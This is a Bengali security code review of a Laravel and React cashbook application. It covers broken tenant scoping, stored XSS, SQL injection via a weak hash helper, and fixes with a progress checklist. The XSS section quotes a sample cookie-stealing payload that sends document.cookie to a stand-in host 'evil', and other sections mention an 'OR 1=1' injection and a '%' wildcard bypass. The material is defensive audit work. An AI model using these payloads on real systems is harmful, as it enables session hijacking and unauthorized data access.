# নিরাপত্তা পর্যালোচনা — বাগ ও আক্রমণের সুযোগ

**তারিখ:** ২০২৬-০৮-১৯
**অবস্থা:** পর্যালোচনা সম্পূর্ণ, কোনো কোড পরিবর্তন করা হয়নি (ব্যবহারকারীর অনুমতির অপেক্ষায়)
**সংশ্লিষ্ট রিপোজিটরি:** `F:/All_Database/www/cashbook_api` (ব্রাঞ্চ `Lutfor`), `F:/All_Database/cashbookbd_react` (ব্রাঞ্চ `Lutfor-Rahman`)
**পদ্ধতি:** কোড পড়ে বিশ্লেষণ — ~২০০ কন্ট্রোলার, ৫৭৪টি API রুট, React সোর্স। চালিয়ে দেখা penetration test নয়।

---

## সারসংক্ষেপ

| # | সমস্যা | ঝুঁকি | কে কাজে লাগাতে পারে |
|---|---|---|---|
| ১.১ | ভাউচার অনুমোদনে পারমিশন ও কোম্পানি যাচাই নেই | 🔴 উচ্চ | যেকোনো লগইন করা স্টাফ, যেকোনো কোম্পানির |
| ১.২ | ক্যাশ বুক / ব্যাংক বুকে stored XSS → টোকেন চুরি | 🔴 উচ্চ | যে কেউ পার্টির নাম বা রিমার্কস লিখতে পারে |
| ১.৩ | লেবার লেজারে কোনো কোম্পানি ফিল্টার নেই | 🔴 উচ্চ | যেকোনো লগইন করা স্টাফ |
| ১.৪ | `get_hash()`-এর মান কাঁচা SQL-এ — ২টি জায়গা | 🔴 উচ্চ | যেকোনো লগইন করা স্টাফ (চাবি নিজের CSRF টোকেন) |
| ১.৫ | `PartyController::update` অন্য কোম্পানির পার্টি নিজের নামে নেয় | 🔴 উচ্চ | যেকোনো লগইন করা স্টাফ |
| ২.১ | ৬২টি এন্ডপয়েন্ট রিকোয়েস্টের `branch_id` বিশ্বাস করে | 🟠 মাঝারি | ব্রাঞ্চ-সীমিত ব্যবহারকারী |
| ২.২ | ব্যাংক তথ্যে ব্রাঞ্চ মেলানো হয় `LIKE` দিয়ে | 🟠 মাঝারি | ভুল হিসাব + ব্রাঞ্চ সীমা পেরোনো |
| ২.৩ | ৩২টি পরিবর্তনকারী এন্ডপয়েন্ট কাঁচা id দিয়ে রেকর্ড তোলে | 🟠 মাঝারি | যেকোনো লগইন করা স্টাফ |
| ৩.১ | মৃত পাবলিক রুট `/api/reports/due-pdf` | 🟡 ছোট | — |
| ৩.২ | আপলোড ফোল্ডার কেবল `.htaccess`-এর ভরসায় | 🟡 ছোট | nginx সার্ভার হলে যে কেউ |
| ৩.৩ | প্রোডাকশনে `APP_DEBUG` যাচাই করা দরকার | 🟡 ছোট | — |

---

## ১. উচ্চ ঝুঁকি

### ১.১ ভাউচার অনুমোদনে কোনো পারমিশন বা কোম্পানি যাচাই নেই

**কোথায়:** `app/Http/Controllers/Transaction/ReceivedController.php` → `approved()`
**রুট:** `routes/api.php:426` — `GET accounts/voucher/approved/{id}`

```php
public function approved($id)
{
    $mtm = MainTransactionMaster::find($id);   // যেকোনো id, যেকোনো কোম্পানির

    if (! $mtm) {
        return notFound('Transaction Not Found');
    }

    $mtm->is_approved   = '1';
    $mtm->approved_by   = Auth::id();
    $mtm->approved_date = \Carbon\Carbon::now();
    $mtm->save();
```

**সমস্যা কী:** `cashbook.approved` পারমিশনটি কেবল React-এ যাচাই হয়
(`src/components/modules/reports/cashbook/CashBook.tsx:111`)। ব্যাকএন্ডে পারমিশন যাচাই নেই,
কোম্পানি বা ব্রাঞ্চ স্কোপও নেই। `MainTransactionMaster` মডেলে কোনো global scope নেই — পুরো
কোডবেইজে `addGlobalScope` একটিও নেই — কাজেই `find($id)` সত্যিই সব কোম্পানির সব ভাউচার দেখে।

**কী করা যায়:** যেকোনো লগইন করা স্টাফ (অনুমোদনের ক্ষমতা না থাকলেও, অন্য কোম্পানির হলেও)
`GET /api/accounts/voucher/approved/1`, `/2`, `/3` … চালিয়ে ডাটাবেইজের **যেকোনো ভাউচার
অনুমোদিত** করে দিতে পারে। id ক্রমিক, তাই একটা লুপই যথেষ্ট। নিজের তোলা ভাউচার নিজে
অনুমোদন করা মানে অনুমোদন-ব্যবস্থাটাই অর্থহীন হয়ে যাওয়া।

**কেন এটা বাদ পড়া, নকশা নয়:** একই কাজের উল্টো দিকটা ঠিকভাবেই লেখা —
`app/Http/Controllers/VoucherModification/VoucherModificationController.php:715`
(`removeApprovalById`) শুরুই হয় `denyUnlessPermitted('remove.approval')` দিয়ে।

**সমাধান:**

1. `denyUnlessPermitted('cashbook.approved')` যোগ করা (একই ফাইলে ব্যবহৃত প্যাটার্ন)
2. রেকর্ড তোলার সময় স্কোপ: `->where('company_id', auth()->user()->company_id)` এবং
   `branchInReach($mtm->branch_id)`
3. রুটটিকে `GET` থেকে `POST`-এ সরানো — অবস্থা বদলায় এমন কাজ GET-এ থাকা উচিত নয়

---

### ১.২ ক্যাশ বুক / ব্যাংক বুকে stored XSS → সেশন টোকেন চুরি

**ব্যাকএন্ড (HTML বানায়, escape করে না):** `app/Http/Controllers/Reports/ReportsController.php`

- লাইন ১১৫২–১১৫৮ ও ১৭০০–১৭০৬ — পার্টির নাম:

```php
$record->nam = '<span>' . $customerName . '</span></br>' . $record->nam;
```

- লাইন ১৮৪১–১৮৪৩ — সবচেয়ে বিপজ্জনক, ব্যবহারকারীর লেখা রিমার্কস সরাসরি HTML অ্যাট্রিবিউটে:

```php
$nam = '<span style="..." data-id="' . $paymentlist->mtm_id . '" class="purchase"
        data-toggle="tooltip" title="' . $paymentlist->remarks . '">' . ... . '</span>';
```

**ফ্রন্টএন্ড (কাঁচা HTML হিসেবে বসায়):**

| ফাইল | লাইন |
|---|---|
| `src/components/modules/reports/cashbook/CashBook.tsx` | ৩১৮ |
| `src/components/modules/reports/cashbook/CashBookPrint.tsx` | ১৪৪ |
| `src/components/modules/reports/bankbook/BankBook.tsx` | ৩৭১ |
| `src/components/modules/reports/bankbook/BankBookPrint.tsx` | ১৫১ |

```tsx
<span dangerouslySetInnerHTML={{ __html: row.nam }}></span>
```

**কী করা যায়:** ভাউচারের রিমার্কসে একটা `"` দিয়ে অ্যাট্রিবিউট ভেঙে বেরিয়ে আসা যায় —
`" onmouseover="fetch('https://evil/?c='+document.cookie)` ধরনের লেখা। পার্টির নামেও একই।
এরপর **যে-ই ক্যাশ বুক বা ব্যাংক বুক খুলবে**, তার ব্রাউজারে স্ক্রিপ্টটি চলবে।

**কেন এটা টোকেন চুরির সমান:** লগইন টোকেন `_trio_lead_token` কুকিতে থাকে, যা JavaScript পড়তে
পারে (`src/features/authReducer.tsx:52`) — httpOnly নয়, হতেও পারে না, কারণ JS নিজেই সেট করে।
কাজেই একজন সাধারণ কর্মচারীর লেখা এক লাইন থেকে অ্যাডমিনের সেশন হাতছাড়া হতে পারে।

**সমাধান (যেকোনো একটি, দ্বিতীয়টি ভালো):**

1. **দ্রুত:** সার্ভারে বসানোর আগে escape — `e($customerName)`, `e($paymentlist->remarks)`
2. **টেকসই:** নাম, রিমার্কস, ব্রাঞ্চ আলাদা ফিল্ডে পাঠানো এবং React-এ সাধারণ টেক্সট হিসেবে
   দেখানো; `dangerouslySetInnerHTML` চারটি জায়গা থেকেই তুলে দেওয়া। HTML বানানোর কাজটা
   রিপোর্ট কুয়েরির নয়।

---

### ১.৩ লেবার লেজারে কোনো কোম্পানি ফিল্টার নেই

**কোথায়:** `app/Http/Controllers/Reports/ReportsController.php` → `labourLedgerData()` (~লাইন ৬৭০০)
**রুট:** `routes/api.php:375` — `POST reports/labour/ledger`

```php
$branchId = $request->branchId;               // branchInReach() ছাড়া, কাঁচা
...
->when($branchId, function ($query) use ($branchId) {
    return $query->where('branch_id', $branchId);
})
```

পুরো কুয়েরিতে `company_id` কোথাও নেই। মেথডের ভেতরে `company_id` একবারই আছে — কেবল
ব্রাঞ্চের নাম দেখানোর জন্য (`Branch::where('company_id', $user->company_id)->pluck(...)`),
মূল কুয়েরিতে নয়।

**কী করা যায়:**

- অন্য কোম্পানির `branchId` পাঠালে সেই কোম্পানির লেবার ভাউচার ফেরত আসে
- `branchId` **একেবারে না পাঠালে** শর্তটি বাদ পড়ে, ফলে **সব কোম্পানির** লেবার লেজার একসাথে —
  ভাউচার নম্বর, তারিখ, সরবরাহকারীর নাম, টাকার অঙ্ক সহ

**সমাধান:** `$branchId = branchInReach($request->branchId);` এবং কুয়েরিতে
`->where('company_id', auth()->user()->company_id)` যোগ করা।

---


### ১.৪ `get_hash()` থেকে SQL ইনজেকশন — ২টি জায়গা

*(এটি প্রথম পর্যালোচনায় ধরা পড়েনি; ২.৩-এর ব্যাচ ২ করতে গিয়ে পাওয়া। §৪-এর
"SQL ইনজেকশন পাওয়া যায়নি" দাবিটি এ কারণে সংশোধন করা হয়েছে।)*

**মূল কারণ:** `app/Helpers/NioHash.php:21` — `get_hash()`

```php
$ukey = substr(csrf_token(), -4);              // চাবি = নিজের CSRF টোকেনের শেষ ৪ অক্ষর
$iv   = substr(hash('sha256', $ukey), 0, 16);
$hash = openssl_decrypt(base64_decode($data), 'aes-128-cbc', $ukey, 0, $iv);
return ($hash) ? $hash : false;                // যা এনক্রিপ্ট করা ছিল, হুবহু তাই
```

চাবিটা কলারের **নিজের** CSRF টোকেন থেকে বানানো, আর লগইন করা ব্যবহারকারী নিজের টোকেন
জানে (পাতার `<meta name="csrf-token">`-এ থাকে)। কাজেই সে নিজেই যেকোনো স্ট্রিং এনক্রিপ্ট
করে পাঠাতে পারে, `get_hash()` সেটাই ফেরত দেয়। **এটি id লুকানোর আড়াল, কোনো যাচাই নয়** —
`get_hash()`-এর ফেরত মানকে বিশ্বস্ত ধরা যায় না।

১০৯টি `get_hash()` কলের মধ্যে ১০৭টি নিরাপদ (`find()` বা বাইন্ডিং)। দুটি কাঁচা SQL-এ বসত:

| কোথায় | রুট | কী হতো |
|---|---|---|
| `Party/PartyController.php:367,370` (`update`) | `Route::resource('party')` — `web.php:606` | কোট ছাড়া, `UPDATE`-এর `WHERE`-এ → `1 OR 1=1` দিলে **সব পার্টির ঠিকানা** একসাথে বদলে যেত |
| `Tourism/VisaController.php:296` (`updateTransactionDetails`) | Visa update | কোটের ভেতরে, কিন্তু কোটটাও আক্রমণকারীর হাতে |

**সমাধান (প্রয়োগ করা হয়েছে):** দুই জায়গাতেই `(int)` কাস্ট ও বাইন্ডিং (`?`)।

**যা এখনো ভাবার:** `NioHash`-এর চাবি CSRF টোকেন থেকে না নিয়ে `APP_KEY` থেকে নেওয়া
উচিত (বা Laravel-এর নিজস্ব `encrypt()`/`decrypt()` ব্যবহার), নইলে বাকি ১০৭টি কলেও
"id যাচাই হয়ে এসেছে" ধরে নেওয়ার ঝুঁকি থেকে যায়। আলাদা কাজ, সব রুট স্পর্শ করে।

---

### ১.৫ `PartyController::update` অন্য কোম্পানির পার্টি নিজের নামে নিয়ে নিত

*(এটিও প্রথম পর্যালোচনায় ছিল না — ২.৩-এর তালিকায় ছিল না।)*

`app/Http/Controllers/Party/PartyController.php` → `update()`

```php
$party = PartyInfo::find($customerId);            // স্কোপ নেই
...
$party->company_id = \Auth::user()->company_id;   // ← নিজের কোম্পানি বসিয়ে দিত
```

অর্থাৎ শুধু অন্যের রেকর্ড বদলানো নয় — **রেকর্ডটি নিজের কোম্পানিতে সরিয়ে নেওয়া**।
৭৬৬টি পার্টির প্রতিটিই নাগালে ছিল।

**সমাধান (প্রয়োগ করা হয়েছে):** `PartyInfo::where('company_id', ...)->find()` ও null-গার্ড।

---

## ২. মাঝারি ঝুঁকি

### ২.১ ৬২টি এন্ডপয়েন্ট রিকোয়েস্টের `branch_id` সরাসরি বিশ্বাস করে

কোডবেইজে সঠিক উপায়টি আগে থেকেই আছে — `app/Helpers/helpers.php` এর `branchInReach()`, যা
মানটিকে `int`-এ ঢালে **এবং** নাগালের বাইরের ব্রাঞ্চ চাইলে 403 দেয়:

```php
$outOfReach = array_diff($asked, $inReach);
if (!empty($outOfReach)) {
    abort(403, 'That branch does not belong to your company.');
}
```

কিন্তু ৬২টি কন্ট্রোলার-মেথড এটি ব্যবহার না করে `$request->branch_id` সরাসরি কুয়েরিতে বসায়।
এগুলোর বেশিরভাগে `company_id` ফিল্টার থাকায় অন্য কোম্পানির ডাটা বেরোয় না — কিন্তু
**একই কোম্পানির অন্য ব্রাঞ্চের হিসাব** বেরিয়ে যায়। যে ব্যবহারকারীকে ইচ্ছে করেই এক ব্রাঞ্চে
সীমাবদ্ধ রাখা হয়েছে, সে অনুরোধে অন্য ব্রাঞ্চের id বসিয়ে সেই ব্রাঞ্চের রিপোর্ট দেখতে পারে।

একই রিপোর্টের দুই সংস্করণে দুই নিয়ম, যা অসামঞ্জস্যটা স্পষ্ট করে:

| মেথড | ব্রাঞ্চ যাচাই |
|---|---|
| `ReportsController::groupReportData` (লাইন ৪৭৩, পুরোনো web রুট) | নেই |
| `ReportsController::apiGroupReportData` (লাইন ৫০২, React ব্যবহার করে) | আছে — `Branch::where('company_id', ...)->findOrFail()` |

**সমাধান:** যেখানে রিকোয়েস্ট থেকে ব্রাঞ্চ নেওয়া হয়, সব জায়গায় `branchInReach()` দিয়ে নেওয়া।
কাজটা যান্ত্রিক, কিন্তু ৬২টি জায়গা — ধাপে ধাপে করা উচিত, মডিউল ধরে ধরে।

---

### ২.২ ব্যাংক তথ্যে ব্রাঞ্চ মেলানো হয় `LIKE` দিয়ে

**কোথায়:** `app/Http/Controllers/Reports/ReportsController.php:4284` (`bankBalance`) এবং
`:4317` (`bankLoad`)

```php
->where('mtm.branch_id', 'like', "%$branchId%")
```

**দুটি সমস্যা:**

1. **ভুল হিসাব:** ব্রাঞ্চ `1` চাইলে `1`, `11`, `12`, `21`, `100`, `101`… সবগুলোর লেনদেন মিলে যায়।
   অর্থাৎ ব্যাংক ব্যালেন্স রিপোর্টে অন্য ব্রাঞ্চের অঙ্ক যোগ হয়ে যাচ্ছে।
2. **ব্রাঞ্চ সীমা পেরোনো:** `branch_id` হিসেবে `%` পাঠালে কোম্পানির সব ব্রাঞ্চের ব্যাংক ব্যালেন্স
   একসাথে আসে।

SQL ইনজেকশন নয় — মানটি বাইন্ডিং হিসেবেই যায় — কিন্তু LIKE প্যাটার্নে ওয়াইল্ডকার্ড ঢোকানো যায়।
কোম্পানি ফিল্টার আছে, তাই ক্ষতি কোম্পানির ভেতরেই সীমাবদ্ধ।

**সমাধান:** `->where('mtm.branch_id', branchInReach($branchId))`, আর "সব ব্রাঞ্চ" দরকার হলে
`whereIn('mtm.branch_id', branchScope($branchId))`।

---

### ২.৩ ৩২টি পরিবর্তনকারী এন্ডপয়েন্ট কাঁচা id দিয়ে রেকর্ড তোলে

কোম্পানি স্কোপ বা পারমিশন যাচাই ছাড়াই `Model::find($id)` → `save()` / `delete()`।
উল্লেখযোগ্য কয়েকটি:

| ফাইল | মেথড |
|---|---|
| `Products/ItemController.php:293` | `update` |
| `Products/CategoryController.php:126` | `update` |
| `Party/AreaController.php:150, 174` | `update`, `deletearea` |
| `Hrms/EmployeeController.php:272, 775` | `update`, `employeeStatusChange` |
| `Hrms/DesignationManagementController.php:213, 245` | `designationUpdate`, `designationDelete` |
| `Company/BranchTypeController.php:105` | `update` |
| `Accounts/LevelThreeController.php:128` | `delete` |
| `Admin/DaycloseController.php:214` | `destroy` |
| `Reports/ReportsController.php:5821` | `cashBookUpdate` |

বেশিরভাগই পুরোনো web UI-এর রুটে (`routes/web.php`, `auth` middleware-এর ভেতরে), তাই
লগইন ছাড়া নাগাল নেই — কিন্তু **যেকোনো লগইন করা ব্যবহারকারী, যেকোনো কোম্পানির**, অন্য
কোম্পানির পণ্য/এলাকা/পদবি/কর্মচারী বদলে বা মুছে দিতে পারে।

**সমাধান:** রেকর্ড তোলার সময়ই স্কোপ — `Item::where('company_id', auth()->user()->company_id)->findOrFail($id)`
ধরনের, এবং যেখানে প্রযোজ্য পারমিশন যাচাই।


#### যা এই পাসে করা গেল না

**`Hrms/DesignationManagementController.php` — `designationUpdate`, `designationDelete`**

`hrm_designation` টেবিলে **`company_id`ও নেই, `branch_id`ও নেই**। ৫২টি পদবি সব
কোম্পানির মধ্যে ভাগ করা। তাই lookup-এ স্কোপ বসানোর কিছু নেই — ঠিক করতে হলে টেবিলে
কলাম যোগ করে backfill করতে হবে। উপরন্তু validation-এ `unique:hrm_designation,name`
কোম্পানি-নিরপেক্ষ, তাই এক কোম্পানির পদবির নাম আরেক কোম্পানির সাথে সংঘর্ষে পড়ে।

সিদ্ধান্ত দরকার: পদবি কি ইচ্ছাকৃতভাবেই সব টেন্যান্টের সাধারণ, নাকি এটি বাদ পড়া?

**`Reports/ReportsController.php` — `cashBookUpdate`**

`acc_transaction_details`-এ কোনো tenant কলাম নেই; স্কোপ করতে হলে
`trx_mstr_id → acc_transaction_master → main_trx_master` জুড়ে যেতে হবে। আর মেথডটি
**debit/credit-এর অঙ্ক বদলায়**, তাই এটি এক লাইনের সংশোধন নয় — আলাদা কমিটে সাবধানে।
রুট কেবল `routes/web.php:236` (POST, CSRF সহ), id `NioHash`-এ ঢাকা — যা প্রতিরোধ নয়,
কেবল আড়াল।

**`Accounts/LevelThreeController.php:128` — `delete` আসলে কিছু মোছে না**

তৃতীয় লাইনেই `return $coal3;`, নিচের delete-লজিক পুরোটাই কমেন্ট করা। অর্থাৎ এটি
**ডেটা ফাঁস**, ডেটা মোছা নয়। স্কোপ বসিয়ে ফাঁক বন্ধ করা হয়েছে; মৃত delete-লজিক
ছোঁয়া হয়নি — সেটি ফেরানো নিরাপত্তার কাজ নয়, নতুন আচরণ।

---

## ৩. ছোট ও হাইজিন

### ৩.১ মৃত পাবলিক রুট

`routes/api.php:124` — `GET /api/reports/due-pdf` → `ReportsController::testPdf`।
মেথডটি কমেন্ট করা, তাই ডাটা ফাঁস হয় না (500 দেয়)। auth ছাড়া রুটটি মুছে ফেলা উচিত।

### ৩.২ আপলোড ফোল্ডার কেবল `.htaccess`-এর ভরসায়

দলিল (`public/sale_document/…`) ও ভাউচার ছবি `public/`-এর ভেতরেই থাকে; প্রতিটি ফোল্ডারে
deny-all `.htaccess` স্বয়ংক্রিয়ভাবে বসানো হয় (`SaleDocumentController::prepareDirectory`)।
Apache/LiteSpeed-এ এটি কাজ করে, **nginx `.htaccess` পড়েই না**। কোনো সার্ভার nginx হলে
PDF দলিলগুলো URL দিয়ে নামানো যাবে — আর পাথটি API রেসপন্সেই ফেরত যায় (`documents` ফিল্ড)।
ফাইলনেমে ২০ অক্ষরের random অংশ থাকায় অনুমান করে পাওয়া যাবে না, কিন্তু যার কাছে একবার
পাথ গেছে তার জন্য লগইনের কোনো বাধা নেই।

**সমাধান:** nginx হলে server block-এ ওই পাথগুলো ব্লক করা, অথবা ফাইলগুলো `storage/`-এ
সরিয়ে কেবল কন্ট্রোলারের মাধ্যমে stream করা (`download()` ইতিমধ্যেই সেভাবে কাজ করে)।

### ৩.৩ প্রোডাকশনে `APP_DEBUG`

লোকাল `.env`-এ `APP_ENV=local`, `APP_DEBUG=true` — এটি স্বাভাবিক। শুধু নিশ্চিত করতে হবে
প্রতিটি সার্ভারের `.env`-এ `APP_DEBUG=false`; নইলে যেকোনো এররে Laravel-এর ডিবাগ পেজ
ডাটাবেইজ পাসওয়ার্ড, `APP_KEY` ও SMS ক্রেডেনশিয়াল দেখিয়ে দেয়।

---

## ৪. যা পরীক্ষা করে ভালো পাওয়া গেছে

এগুলো নিয়ে দুশ্চিন্তার কারণ নেই — যাচাই করা হয়েছে:

- **SQL ইনজেকশন — এই দাবিটি সংশোধিত (২০২৬-০৮-১৯, পরে)।** ১৭৬টি কাঁচা `DB::select()`-এর
  বেশিরভাগই নিরাপদ — ভেরিয়েবলগুলো হয় `branchInReach()` (int-এ ঢালা + 403), নয়তো
  `bd_to_us_date()` (কেবল `Y-m-d` বা খালি স্ট্রিং), আর সার্চ টার্ম সবই বাইন্ডিং (`?`)।
  **কিন্তু দুটি জায়গা বাদ পড়েছিল** — বিস্তারিত §১.৪-এ।
- `eval`, `shell_exec`, `system`, `unserialize` — কোথাও নেই।
- `.env` গিটে ট্র্যাক করা নেই (`.gitignore`-এ `*.env`)।
- **অথেনটিকেশন সীমানা শক্ত:** `EnsureUser` middleware স্টাফ ও কাস্টমার টোকেন আলাদা করে,
  বন্ধ করা অ্যাকাউন্ট পরের রিকোয়েস্টেই আটকায়, sanctum টোকেনের মেয়াদ নির্ধারিত।
- **OTP নিরাপদ:** `random_int()` (CSPRNG), ডাটাবেইজে `Hash::make()` করে রাখা, ৫ বার ভুলের
  পর বন্ধ, রুটে `throttle`।
- **ফাইল আপলোড নিরাপদ:** ফাইলের আসল বাইট থেকে এক্সটেনশন নির্ধারণ, হোয়াইটলিস্ট, নিজের বানানো
  ফাইলনেম (`safeUploadName`) — `.php` আপলোড করে চালানোর পথ নেই।
- পাসওয়ার্ড হ্যাশড ও মডেলে `$hidden`; mass assignment ফাঁক নেই (`$guarded = []` বা
  `create($request->all())` কোথাও নেই)।
- **CORS:** `*` নয়, নির্দিষ্ট ডোমেইন তালিকা (`config/cors.php`)।

---

## ৫. পরিধি ও সীমাবদ্ধতা

- এটি **কোড পড়ে করা পর্যালোচনা**, চালিয়ে দেখা penetration test নয়। ১.১, ১.২, ১.৩ —
  এই তিনটির কোড-পথ শেষ পর্যন্ত অনুসরণ করে নিশ্চিত করা হয়েছে; তবু লোকাল সার্ভারে চালিয়ে
  প্রমাণ করা যেতে পারে।
- ২.১ ও ২.৩ এর সংখ্যাগুলো (৬২ ও ৩২) স্বয়ংক্রিয় স্ক্যানের ফল। কয়েকটি হাতে যাচাই করে
  মিথ্যা-সতর্কতা বাদ দেওয়া হয়েছে (যেমন `BranchController::updateBranch` ও
  `ProductTrackingSettingController::index` — এ দুটি আসলে সঠিকভাবে স্কোপড)। বাকিগুলো
  একে একে যাচাই করা বাকি।
- মোবাইল অ্যাপ (`F:/All_Database/mobileapp`) এই পর্যালোচনার আওতায় ছিল না।
- তৃতীয় পক্ষের প্যাকেজের known CVE (`composer audit`, `npm audit`) দেখা হয়নি।

---

## ৬. অগ্রাধিকার

**এখনই:**

- [x] ১.১ — `approved()` এ পারমিশন ও কোম্পানি স্কোপ যোগ, রুট POST-এ সরানো — `5db17fba` (API) + `c2017a7` (React)
- [x] ১.২ — `e()` দিয়ে escape — `a30f02ee`। `dangerouslySetInnerHTML` তোলা এখনো বাকি (নিচে দেখুন)
- [x] ১.৩ — `labourLedgerData` এ `branchScope()` — `997f6262`
- [x] ১.৪ — `get_hash()`-এর মান কাঁচা SQL-এ: `(int)` কাস্ট ও বাইন্ডিং, ২টি জায়গায়
- [x] ১.৫ — `PartyController::update` এ কোম্পানি স্কোপ ও null-গার্ড
- [ ] ১.৬ — `NioHash`-এর চাবি CSRF টোকেন থেকে সরিয়ে `APP_KEY`-তে নেওয়া (বাকি ১০৭টি `get_hash()` কলের ভিত্তি)

**এর পরে:**

- [x] ২.২ — ব্যাংক রিপোর্টের `LIKE` সরানো — `6bdea6c4`। নির্দিষ্ট ব্রাঞ্চের অঙ্ক কমবে; সেটিই সংশোধন
- [~] ২.৩ — স্কোপড lookup। ব্যাচ ১ (৯টি) — `ca459d47`; ব্যাচ ২ (Party) — নিচে ১.৪/১.৫ দেখুন। স্ক্যানে মোট **৮৫টি** মেথড বাকি, মডিউল ধরে ধরে
- [ ] ২.১ — `branchInReach()`/`branchScope()`। স্ক্যানে **৮৪টি** মেথড কাঁচা `branch_id` পড়ে (ডকে লেখা ৬২-র চেয়ে বেশি; ইতিমধ্যে ৬২ জায়গায় হেল্পার ব্যবহৃত)

**হাইজিন:**

- [ ] ৩.১ — মৃত রুট মুছে ফেলা
- [ ] ৩.২ — nginx সার্ভারে আপলোড ফোল্ডার ব্লক করা
- [ ] ৩.৩ — প্রতিটি সার্ভারের `.env`-এ `APP_DEBUG=false` যাচাই
- [ ] `composer audit` ও `npm audit` চালিয়ে প্যাকেজের CVE দেখা
